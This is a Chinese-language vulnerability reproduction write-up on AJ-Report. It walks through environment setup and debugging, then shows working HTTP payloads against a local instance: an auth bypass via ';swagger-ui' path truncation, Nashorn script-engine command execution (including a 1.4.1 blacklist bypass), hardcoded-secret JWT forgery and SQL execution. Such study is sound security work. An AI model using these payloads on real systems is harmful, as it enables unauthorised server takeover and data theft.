### 前言

记录一下一个之前没有正经审计过项目，基本没接触过java的新手如何根据有限的漏洞信息，尝试用不同的思路进行复现审计

### AJ-Report环境搭建

直接jar包启动？我不，我就要自己编译，装maven，测试执行`mvn help:system`的时候报了个error，意思大概就是下载失败，查了查大概是网络问题，换成阿里云的源还不行，自我怀疑了很久，后面发现是梯子的问题，关了就好了...

![image-20241002171321250](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-82225909bb38522b092b55a05e4c42ec8b7059c6.png)

#### maven是什么

好，第一个问题，maven是什么

Maven是一个Java项目管理和构建工具，它可以定义项目结构、项目依赖，并使用统一的方式进行自动化构建。

项目描述文件是`pom.xml`，存放Java源码的目录是`src/main/java`，存放资源文件的目录是`src/main/resources`，存放测试源码的目录是`src/test/java`，存放测试资源的目录是`src/test/resources`，所有编译、打包生成的文件都放在`target`目录里

![image-20241003110205629](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-4c0f47045f708250119ef3214305d58e14fe72d9.png)

pom.xml里，`groupId`类似于Java的包名，`artifactId`类似于Java的类名，使用``声明一个依赖后，Maven就会自动下载这个依赖包并把它放到classpath中。Maven使用`groupId`，`artifactId`和`version`唯一定位一个依赖，Maven从哪下载依赖呢，当然是镜像仓库。进入到`pom.xml`所在目录，执行`mvn clean package`即可在`target`目录下获得编译后自动打包的jar

![image-20241003110621302](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-740331715f4a446d0473c22b5b3efc5ae57f862c.png)

按照AJ-Report项目文档build的时候又报了个error，大概意思是要用JDK而不是JRE，所以改了改环境变量，顺便配置了一下多java环境，然后一切顺利

![image-20241002173923075](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-52cf3e4055c3e982b924fa60c6b5e83b7b9d927c.png)

一开始用IDEA导入项目源码发现很多import标红，比如`com.anji.plus.gaea`这些玩意，因为这个看着不像是公共依赖，我还以为是源码少，然后发现用maven编译完再jadx反编译的话就有`com.anji.plus.gaea`了，后面发现这其实就是公共依赖，maven自动索引从阿里云镜像库下载补齐，之后就好了

![image-20241002181920373](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-0d9147a2ff0d6442a84f3c9fa674a5b6d22e41c8.png)

如果是用IDEA导入jar包的话也可以，但是需要在项目结构里添加Libraries

![image-20241003223527318](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-2372ee4c8a9410a6e31d017dc1021459b6b931f8.png)

#### SpringBoot是什么

Spring Boot是一个基于Spring的套件，它帮我们预组装了Spring的一系列组件，以便以尽可能少的代码和配置来开发基于Spring的Java应用程序，其设计目的是用来简化Spring应用搭建和开发过程，提供一个开箱即用的应用程序架构，我们基于Spring Boot的预置结构继续开发。目前Java后端主流框架还有Struts 2、Hibernate、JavaServer Faces（JSF）、Vaadin、GWT、Play Framework和Vert.x等

具体看文档就好https://springdoc.cn/spring-boot/getting-started.html#getting-started

#### Tomcat是什么

SpringBoot默认的启动容器是Tomcat，大概就是spring-boot-starter-parent-&gt;spring-boot-dependencies-&gt;spring-boot-starter-web-&gt;spring-boot-starter-tomcat，Tomcat 的组成核心全部都通过 Maven 引入过来了，所以不需要额外安装Tomcat

<https://javabetter.cn/springboot/tomcat.html>

![image-20241003125008109](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-e2bcb32ad551f22b25722b4e55438bf6bc5b8acb.png)

Tomcat用来装载javaweb程序，可以称它为web容器，你的jsp/servlet程序需要运行在Web容器上，Web容器有很多种，JBoss、WebLogic等等，Tomcat是其中一种。web项目多数需要http协议，也就是基于请求和响应，那如何处理这个请求呢，他需要创建servlet来处理，servlet其实就是java程序，只是在服务器端的java程序servlet通过配置文件拦截你的请求，并进行相应处理，然后展示给你相应界面，那么servlet如何创建？tomcat就是帮助你创建servlet的东西。

### 一些IDEA使用技巧

#### 动态调试

改完配置文件之后，不管是jar项目还是源码项目，用idea直接调试都连不上数据库，报错，看起来就是完全没连上，看着依赖什么的也没问题，很神奇

`ERROR com.zaxxer.hikari.pool.HikariPool:593 - HikariPool-1 - Exception during pool initialization. com.mysql.cj.jdbc.exceptions.CommunicationsException: Communications link failure`

![image-20241003183838858](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-271f1c43087eb7941b1fe07a4be76680a87f0544.png)

编译好之后命令行运行jar是没问题的，感觉跟IDEA有关系但是没有证据

![image-20241003183920443](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-c287a82b0e4d129dabc2fb980a8e6fc63e382969.png)

那只能试试远程调试了

![image-20241003202614219](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-ef61589c6ec1a663c729c2b724cca349433fe7ec.png)

一开始断点没打上，忘了是因为啥了，反正最后好了，我把AJ-Report项目里启动jar包的bat脚本启动命令改成了：`"%JAVA_HOME%"\bin\java -Xdebug -agentlib:jdwp=transport=dt_socket,server=y,suspend=n,address=50055 -Xbootclasspath/a:%LIB_JARS% -jar -Dspring.config.location=%CONF_YML% %BIN_DIR%\lib\%BOOT_JAR%`，开始调试后socket会连上，之后访问web端进行相关请求来触发这个断点

![image-20241003202558934](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-0f844fcac32607250b795ea55f21329172a666d6.png)

步过：一行一行的往下走，不会进入到其他方法的内部。  
步入：如果当前行有方法执行，可以进入方法的内部（不会进入官方定义的方法，仅能进入自定义的方法）。  
强制步入：如果当前行有方法执行，可以进入方法的内部（可以进入官方定义的方法，这在查看底层源码时非常有用）。  
智能步入：如果当前行有多个方法同时被执行，IDEA 将会询问你要进入哪个方法。  
步出：从步入的方法内执行完该方法，然后退出到方法调用处。

#### 其他技巧

##### 全局搜索

Ctrl+shift+F全局搜索，跟搜狗输入法快捷键冲突了，要先关掉输入法的快捷键

发现搜一样的东西，匹配数量经常会变，后来发现跟settings里配置的最大匹配数有关系，因为最大匹配数小于真正的数量，标绿色的是因为在代码里是字符串

![image-20241002204907817](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-d2a6dbe357a16da7a1048c3aa87b0b892f4ffb35.png)

##### 调用和层次结构

Alt+F7，查看一个Java类、方法或变量的直接使用情况

![image-20241002212047094](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-a94e73ca85703706303e97a90331b1d0d82c4c50.png)

调用层次结构

看哪个地方调用了getLanguage，比如这里就是Calendar.createCalendar调用了getLanguage，下一级就是Calendar.getInstance调用了createCalendar

![image-20241002213039893](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-0c9f5545963177a87d0f16ad8be7589121e67119.png)

类型层次结构，每一个都是下一个的父类

![image-20241002213924219](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-73e25365dc741f00fb4f502d70c398f21b784517.png)

接下来开始正式审计

### swagger-ui截断绕过

URL中有一个保留字符分号`;`，主要为参数进行分割使用，有时候是请求中传递的参数太多了，所以使用分号`;`将参数对（key=value）连接起来作为一个请求参数进⾏传递。

Tomcat在解析请求路径时，会自行修正路径，并使用修正后的路径来匹配对应的Servlet，然而，在路径需要修正的情况下，Tomcat自行修正后得到的URI路径跟使用getRequestURI方法得到的URI路径不一致，因而在我们去对请求路径做权限访问控制时，容易导致绕过。具体Tomcat的源码就不跟了(

| payload | getRequestURL | getRequestURI | getServletPath |
|---|---|---|---|
| `/index` | `http://127.0.0.1:8081/index` | `/index` | `/index` |
| `/./index` | `http://127.0.0.1:8081/./index` | `/./index` | `/index` |
| `/.;/index` | `http://127.0.0.1:8081/.;/index` | `/.;/index` | `/index` |
| `/a/../index` | `http://127.0.0.1:8081/a/../index` | `/a/../index` | `/index` |
| `/a/..;/index` | `http://127.0.0.1:8081/a/..;/index` | `/a/..;/index` | `/index` |
| `/;/index` | `http://127.0.0.1:8081/;/index` | `/;/index` | `/index` |
| `/;a/index` | `http://127.0.0.1:8081/;a/index` | `/;a/index` | `/index` |
| `/%2e/index` | `http://127.0.0.1:8081/%2e/index` | `/%2e/index` | `/index` |
| `/inde%78` | `http://127.0.0.1:8081/inde%78` | `/inde%78` | `/index` |

前置知识了解到这里，可以开始看源码了

如果直接访问后台接口的话，会返回`{"code":"User.credentials.expired","message":"The Token has expired"}`全局搜一下，定位到error方法

![image-20241019203618306](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-7dba0e97c2cadf20a6ff445fb314664365dcf304.png)

验证Authorization和Share-Token，不通过的话调用error方法，都通过才能到filterChain.doFilter那里正常请求

![image-20241020180342614](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-658c025ed1b03e97065aeed5622cf8aa6f65cf6d.png)

这里是使用getRequestURI来获取uri，所以可以用分号来绕过，如果`uri`包含`swagger-ui`直接放行，就不需要验证token那些了，直接`/dataSetParam/verification;swagger-ui/`这样即可

![image-20241020171100386](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-bd5d94095f206d85704ca315e67dbea43343324b.png)

### validationRule参数任意命令执行

已知：`该平台可以通过post方式在validationRules参数对应值中进行命令执行，可以获得服务器权限，登陆管理后台接管大屏。`

所以我们要先找到validationRules参数在哪，通过全局搜索，来确定可疑的地方

![image-20241019165129356](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-b2ca998de93d21f64bea3aaa02fcacf337e94914.png)

全局搜索`validationRules`，发现在这有个`engine.eval(validationRules)`，eval大家都知道，就是一个命令执行的函数，虽然跟php里的eval不大一样，但是大概就是在`verification`方法这里执行了

看一下engine的声明，criptEngineManager 获取名为 "JavaScript" 的脚本引擎。在Java 8-15的版本中，默认情况下，"JavaScript" 引擎指的是 Nashorn 引擎。Nashorn 支持 JavaScript 与 Java 之间的互操作性，允许JavaScript代码调用Java类和方法。

![image-20241019221324439](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-31b3cbe658af47341b992450a647b9cc25312562.png)

查看调用层次结构，发现有两个调用，所以有两个入口点，分别看一下

一个是`com.anjiplus.template.gaea.business.modules.datasetparam.controller.DataSetParamController#verification`

另一个是`com.anjiplus.template.gaea.business.modules.dataset.controller.DataSetController#testTransform`

![image-20241019220825464](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-3e64d896454b6aa73c453074f7175a56e2ff5ac9.png)

所以这时候就有两个路子可以走了

#### 入口点为verification

这里先跟第一个

![image-20241019221154517](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-a8f438994a6f4b25009480916c5fe7bf84478f4e.png)

逻辑很简单，就是获取了两个参数的值，分别是SampleItem和ValidationRules

![image-20241020105711805](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-d9c7286f5a9bf051ade8b1ed9163884a9c9a6ae7.png)

所以我们需要构造SampleItem和ValidationRules参数，而且传入eval的是validationRules，所以payload是在validationRules里构造的

那怎么构造呢，先看一个示例

eval是可以执行脚本语言的，比如下面这样

```java
import javax.script.*;

public class EvalScript {
    public static void main(String[] args) throws Exception {
        ScriptEngineManager manager = new ScriptEngineManager();
        ScriptEngine engine = manager.getEngineByName("nashorn");

        // evaluate JavaScript code
        engine.eval("print('Hello, World')");
    }
}
```

但是这里并不是这种用法，源码里用到了`Invocable`接口，`Invocable`由 ScriptEngines 实现的可选接口，该 ScriptEngines 的方法允许在以前执行过的脚本中调用程序，看一个网上的示例，真正的执行是在`invokeFunction`那里调用了eval那里声明的`hello`函数

```java
import javax.script.*;

public class InvokeScriptFunction {
    public static void main(String[] args) throws Exception {
        ScriptEngineManager manager = new ScriptEngineManager();
        ScriptEngine engine = manager.getEngineByName("nashorn");

        // evaluate JavaScript code that defines a function with one parameter
        engine.eval("function hello(name) { print('Hello, ' + name) }");

        // create an Invocable object by casting the script engine object
        Invocable inv = (Invocable) engine;

        // invoke the function named "hello" with "Scripting!" as the argument
        inv.invokeFunction("hello", "Scripting!");
    }
}
```

所以我们可以照着示例里的样子构造一个函数，内容是`java.lang.Runtime.getRuntime().exec`之类的来执行命令，而且因为invokeFunction那里写死的是verification，所以我们构造的函数名也得是verification

```http
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: 127.0.0.1:9095
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 406

{"sampleItem":"1","validationRules":"function verification(){\nvar x=java.lang.Runtime.getRuntime().exec(\"calc\")\n}"}

```

执行成功

![image-20241020113518656](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-4b45c9709fc8e7b3263b0f2e2550c551f14e9577.png)

调试的时候发现一直是到这里才执行了`calc`命令，所以我们上面对于eval起到了一个类似于声明定义一个脚本的作用，最后通过Invocable接口的invokeFunction来调用这个脚本中的函数的分析没啥问题

![image-20241020112832037](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-54471da75d188c2cf9f1e13413b99b5e1a60bc5d.png)

在调试中发现一个奇怪的现象，不管我方法名随便怎么写都正常执行了，跟之前“invocable.invokeFunction调用的函数名得是engine.eval的定义的函数”的说法不一样，但是本地自己写个简单demo结果就没问题

![image-20241020114335158](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-d297722267f474b5636efce8335b2f6a3f980d2e.png)

后面调的时候突然发现了盲点，我执行的明明是whoami，怎么弹了个计算器，然后反应过来有可能是内存的原因，所以重启一下环境，这样就正常了

![image-20241020000408291](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-ed9e7dc9d23ff49493787323b5293567efc19105.png)

打回显的话可以用网上的写法：

定义一个verification类，创建操作系统进程的类执行whoami并获取该进程的标准输出流，之后读取输入流然后返回，这样就有回显了

```java
function verification(data){a = new java.lang.ProcessBuilder(\"whoami\").start().getInputStream();r=new java.io.BufferedReader(new java.io.InputStreamReader(a));ss='';while((line = r.readLine()) != null){ss+=line};return ss;}
```

#### 入口点为testTransform

下面跟第二个入口点，调用层次结构，大概触发流程是这样的

`com.anjiplus.template.gaea.business.modules.dataset.controller.testTransform(DataSetTestTransformParam)-----&gt;com.anjiplus.template.gaea.business.modules.dataset.service.impl.testTransform(DataSetDto))-----&gt;com.anjiplus.template.gaea.business.modules.datasetparam.service.impl.verification(List, Map)-----&gt;com.anjiplus.template.gaea.business.modules.datasetparam.service.impl.verification(DataSetParamDto)`

testTransform(DataSetTestTransformParam)是这样的

![image-20241020125035871](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-34d15ad2abe7d9bd83c03a8fdc592632c8abe0f8.png)

跟一下这个DataSetTestTransformParam，定义了五个参数，三个string，两个list

![image-20241020125132880](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-0ae6da2f0ddb30d88a558d2077a05d8f84f479d4.png)

只需要构造这三个参数即可，注意他要从dynSentence里获取body的值，所以构造的时候要加上，其他的看定义都是strings

![image-20241020130618117](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-c4f9b3e61f7e3b4621fbb26c3348cd9afdc61b64.png)

再加上箭头这里的DataSetParamDtoList参数，虽然往后也需要获取DataSetTransformDtoList参数的值，但是到箭头这里就已经调用完成了，所以并不需要构造DataSetTransformDtoList参数

![image-20241020131230084](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-cb1aa33250d9b64b671b4e90aab81ad3464a9fe4.png)

DataSetParamDtoList参数的构造方法上一个入口点提过了，所以直接构造即可

![image-20241020131840663](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-ed955f36c056b65a07651987da01ce8c1fd43c26.png)

```http
POST /dataSet/testTransform;swagger-ui/ HTTP/1.1
Host: 127.0.0.1:9095
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 610

{
  "sourceCode": 1,
  "dynSentence": "{'body':'1'}",
  "dataSetParamDtoList": [
    {
      "sampleItem": "",
      "validationRules": "function verification(){var x=java.lang.Runtime.getRuntime().exec(\"calc\")}"
    }
  ],
  "setType": "1"
}

```

#### 1.4.1版本bypass

1.4.1版本中加了黑名单，对engine做了过滤，但是打了断点再用一开始payload打没反应

![image-20241020162313880](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-d33259cd91a6c8e8848443038b326e6723ec12a9.png)

跟一下getScriptEngine

![image-20241020162606046](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-87df24e6ae5646e477cf8079ce0423d4ee950c00.png)

查了一下，大概作用是这样，就是不能用黑名单的类，也不能用反射

![image-20241020162929301](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-1178aab3765ce5bf2d3987accc3d59ad1e25e52d.png)

用网上流传的payload打会这样

![image-20241020161709875](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-a8e362d8cf5cf2ceec29cd6b59ff153b7668063e.png)

网上查了一下java其他命令执行的方法好像都离不开黑名单里的这三个类和反射的样子，查到一种使用javax.script.ScriptEngineManager开命令执行的方法，感觉不大行但是作为小白还是想试试

```java
public class EvalTest {
    public static void main(String[] args) throws ScriptException {
        Object result = new ScriptEngineManager().getEngineByExtension("js").eval("java.lang.Runtime.getRuntime().exec(\"calc\")");
        System.out.println(result);
    }
}
```

试了一下可以，但是为什么呢，这样执行命令本质不也是执行的java.lang.Runtime，不是把java.lang.Runtime过滤了吗，可能是因为套了一层javax.script.ScriptEngineManager，而java.lang.Runtime在第二层，classfilter那里只看第一层的类？

```http
POST /dataSetParam/verification;swagger-ui/ HTTP/1.1
Host: 127.0.0.1:9095
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 190

{
  "sampleItem": "1",
  "validationRules": "function verification(){var a= new javax.script.ScriptEngineManager().getEngineByExtension(\"js\").eval(\"java.lang.Runtime.getRuntime().exec('calc')\")}"
}

```

![image-20241020165339114](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-e5231988f296b7cd4c7cfa59cc8152141921378c.png)

### JWT身份认证绕过

已知：`程序使用固定的 JWT 密钥，存储的 Redis 密钥使用用户名格式字符。 任何在一小时内登录的用户。 可以用他的用户名伪造 JWT Token 以绕过身份验证`

我们可以知道这个是因为固定JWT秘钥导致的问题

假如swagger那里被修复了，那整个流程就会继续走，走到这再进行校验

![image-20241020181028322](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-3cc905cfe3ef727092d93aaeaa17f887c970c9f0.png)

但是这里没啥，再往后看到GAEA\_SECURITY\_LOGIN\_TOKEN那里，在这里获取了tokenkey，看一下调用

![image-20241020182520555](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-f45741613605d2bb71280398d44516cc913b724b.png)

看到有个createToken，跟一下

```java
    public String createToken(String username, String uuid, Integer type, String tenantCode) {
        String token = JWT.create().withClaim("username", username).withClaim("uuid", uuid).withClaim("type", type).withClaim("tenant", tenantCode).sign(Algorithm.HMAC256(this.gaeaProperties.getSecurity().getJwtSecret()));
        return token;
    }
```

看到有个getJwtSecret，获取jwt的秘钥，跟一下，应该就是这里了，是固定秘钥，这样就跟漏洞详情对上了

![image-20241020182725722](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-b0903c5f2546914a86d1682994f2e9ad106001cc.png)

有固定秘钥就说明我们可以伪造jwt，传入的值都知道了，uuid不知道，但是uuid好像没有参与校验

![image-20241020183018789](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-93b87135fa2da8fc055fe7e9aef801e05a1e2b74.png)

根据固定的type和tenant，加上username=admin，再加上key

![image-20241020183502909](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-3031bb05c1ffeba8299f27dcf70208f0ac6dd023.png)

可以看到加上伪造的Authorization之后通过了校验正常执行命令了

![image-20241020183351162](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-fd68dcf44fbb2778bfb4a2e47839451dac053367.png)

但是还有一个问题

如果admin的token过期的话需要校验sharetoken

![image-20241020184005562](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-a35541b5c71e0708600cc97a2fcec5ac9229ffa4.png)

而这个token有效期只有3600的时间，也就是一个小时以内，如果admin长时间没登过就不行了，所以我们还要想办法过一下这个`shareToken`的检测

![image-20241020184033282](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-16ae0cf486efd05535e0b0a67e72b9f0717fb5a3.png)

全局搜一下shareToken，只有两个设置sharetoken值的地方，都在reportshareserviceimpl里

![image-20241020184617306](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-8e53a1df5731ac16a842ff1b6a4f42a2a5054380.png)

跟进，发现有个createtoken，注意这里正常的reportcode应该是uuid，`String shareCode = UuidUtil.generateShortUuid();`，后面应该是setShareUrl拼接上这个uuid变成一个分享链接，允许访问，如果把reportcode设置成`/`，那就可以正常访问所有的东西（看源码变量命名规则猜测是这样，没细调）

![image-20241020184744846](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-4d50328ef3f0ab568d2d1af57f55047e791d2ce0.png)

跟进createtoken，发现还是硬编码+jwt，依然可以伪造

![image-20241020184442407](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-9226c3f5081e4523276a130c508ad448736457bf.png)

时间戳设置晚一点

![image-20241020190232389](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-9adf9098b465a0eb20ac479d78de318549b62940.png)

可以看到一共有四个参数，根据createtoken的四个参数名，构造一下shareToken，其中时间戳设置的久一点，当然这里的参数也可以通过自己生成一个sharetoken看看参数名

![image-20241020190600667](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-2f0ef72f71afc6f86aa16500757b653ff6eb4785.png)

然后跟之前构造好的Authorization一起，成功执行

![image-20241020190547959](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-35dbd65abaf121ede5d0ab1690dc52972d0a4fd4.png)

### Js参数任意命令执行

在搜索engine.eval的时候，发现还有一个js参数，跟validationRule类似，大概率也存在命令执行，但是可以看到这里js参数是来源于TransformScript参数的

![image-20241019193921900](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-f60e680d8cbda9b8547330dc1972f23c36c6c71f.png)

`TransformScript`参数来源于`DataSetTransformDto`，`DataSetTransformDto`之前有提到过，来源于`testTransform(DataSetTestTransformParam)`

![image-20241022194003641](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-f6bcdeabcbdbcddaf7bafbdcd7c3f3af935d6fc4.png)

理论上这四个入口应该都可以

![image-20241020200724558](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-d5bdcf2ec37be0268e8a1cb1fd1c4c448a135655.png)

#### 入口点为testTransform

大概是这么个顺序

`testTransform-&gt;transform-&gt;getValueFromJs`

在这里进入transform

![image-20241022194403217](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-4c27760d5c1401b137ccc4a953ca2610f2ca8118.png)

然后再进入getValueFromJs执行js

![image-20241022194428764](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-90bc834fa84a31060c5718027c4ad67be3317b66.png)

所以得想一下怎么构造参数能让程序执行到这一步，将断点打在这里

`List transform = dataSetTransformService.transform(dto.getDataSetTransformDtoList(), data);`

根据之前的方法构造，发现报了个错，说是apiurl为空，而且调试发现也没执行到上面这一步

![image-20241022194933273](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-1aceefa81f8e806c1c8c8fe5425760fedefba4fd.png)

发现在上一行`List data = dataSourceService.execute(dataSourceDto);`这里断了，应该就是没有apiurl的原因

![image-20241022195251232](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-d7ca1744f992478f608ff9fa665bf7b8b121a1ba.png)

根据报的错误apiurl not empty全局搜索

![image-20241022195759172](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-8be8d163205f6dcc84e5c716be8321760605fdca.png)

构造的时候要注意header的格式，但是又报错了，说是数据源连接失败，所以这个apiurl得是能访问到的接口

![image-20241022200104545](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-c431519405f4c2c5afdbc71b4df67d5d18eb93cb.png)

```http
POST /dataSet/testTransform;swagger-ui/ HTTP/1.1
Host: 127.0.0.1:9095
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 615

{
  "dynSentence": "{'apiUrl':'http://127.0.0.1:9095/dataSet/testTransform','method':'GET','header':'{\\\"Content-Type\\\":\\\"application/json;charset=UTF-8\\\"}','body':''}",
  "dataSetParamDtoList": [
    {
      "paramName": "",
      "paramDesc": "",
      "paramType": "",
      "sampleItem": "",
      "mandatory": true,
      "requiredFlag": 2,
      "validationRules": ""
    }
  ],
  "dataSetTransformDtoList": [
    {
      "transformType": "js",
      "transformScript": "function dataTransform(){\nvarx=java.lang.Runtime.getRuntime().exec(\"calc\")\n}"
    }
  ],
  "setType": "http"
}
```

执行成功

![image-20241022200222447](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-8dc85f8c30ca07f32301e6735936c0c1c59a4dcd.png)

#### 其他入口点

选了`/reportDashboard/getData`接口做入口点，跟到这发现一开始的`DataSetDto`没了，在`detailSet`里面弄一个新的，而我传入的`setCode`是随便写的，肯定是没有对应的`result`，所以下面`getDynSentence`这些肯定获取不到值，所以就断了。(也有可能可以先用哪个接口把DataSetDto跟setCode对应保存，再用`getData`接口重新获取到之前设置好的`DataSetDto`？感觉是可以的，但是不折腾了

```java
    public DataSetDto detailSet(String setCode) {
        DataSetDto dto = new DataSetDto();
        DataSet result = selectOne("set_code", setCode);
        GaeaBeanUtils.copyAndFormatter(result, dto);
        return getDetailSet(dto, setCode);
    }
```

![image-20241020215915058](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-a6aac86d216def91c99ee5d768455e1ef4f8e386.png)

### SQL注入

#### testTransform接口

已知：`CVE-2024-5356 is a newly disclosed critical vulnerability affecting anji-plus AJ-Report versions up to 1.4.1. This issue lies within an unknown function of the file /dataSet/testTransform;swagger-ui, where manipulation of the argument dynSentence enables SQL injection.`

翻译一下就是/dataSet/testTransform接口存在SQL注入

找了一下这个接口，发现其实就是在后台有个执行SQL命令的地方，但是还是负责任的跟一下看看，这里有一个问题就是需要知道sourceCode才能执行到执行SQL那一步，而sourceCode是管理员添加数据源的时候设置的，通常情况下不好猜，我这里添加了一个数据源“123”

![image-20241022191056936](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-5fa1f07ac003063098c5c9239c8eba9fdda81748.png)

数据包如下

```http
POST /dataSet/testTransform;swagger-ui/ HTTP/1.1
Host: 127.0.0.1:9095
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Connection: close
Content-Length: 610

{"sourceCode":"123","dynSentence":"show DATABASES","dataSetParamDtoList":
[],"dataSetTransformDtoList":[],"setType":"sql"}

```

既然直接能猜到这个洞是怎么回事，那我们直接下个断点开始跟

核心还是进入dataSetsource.testTransform

![image-20241022191701201](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-89fef2f77da2ffe656d640804dbfdd137fa30a40.png)

跟到这的时候发现这里也能获取到mysql的账号密码，应该是全局都没有做限制，算是个比较严重的问题吧

![image-20241022192417727](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-cb37b698bbeb3ece9c3cf7267392bd6179fbb7f7.png)

最后是到originalDataDto这里返回了SQL执行的结果

![image-20241022192717617](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-2f9d7febe28728b512ba9dcfa7736383dd69a41d.png)

#### pageList接口

已知：`受影响的是/pageList文件中的pageList函数。对参数p的操纵会导致sql注入。`

(注入没测出来，最多算个数据库账号密码泄露吧

直接全局搜pageList，但是一开始搜pageList没搜到，应该是在其他jar包里，所以需要导入一下构建索引

![image-20241021224331118](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-a70ebc6fa743b3b53ddb0187c4629a5145271168.png)

下的过程中会自动更新索引

![image-20241021225140108](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-1fa7cb135f3adf76f4e67381cbffb65ad02fc00a.png)

之后就可以搜到了

![image-20241021225428756](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-2b83e9fd23a124bc7be1f4ececaf136fd0034d1c.png)

首先我们需要再这里编辑上数据源

![image-20241022183722195](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-ba730534ca5db23fb39af04b7fd89c0f18baed5e.png)

找到pageList之后先看一下调用，将目标定位datasource，为什么是datasource呢，因为上面数据源也就是datasource

![image-20241022184700145](https://shs3.b.qianxin.com/attack_forum/2024/10/attach-43e0f371d7bd767e4ec84c321a054bde3415103b.png)

